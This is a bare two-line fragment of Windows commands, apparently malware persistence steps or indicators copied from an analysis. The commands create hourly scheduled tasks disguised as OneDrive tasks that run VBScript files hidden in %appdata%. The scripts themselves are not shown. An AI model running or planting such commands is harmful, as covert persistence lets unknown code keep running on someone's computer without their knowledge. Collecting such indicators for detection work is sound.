schtasks /create /tn "OneDriveCs" /sc minute /mo 60 /tr "%appdata%\system2.vbs"
schtasks /create /tn "OneDriveFe" /sc minute /mo 60 /tr "%appdata%\system3.vbs"
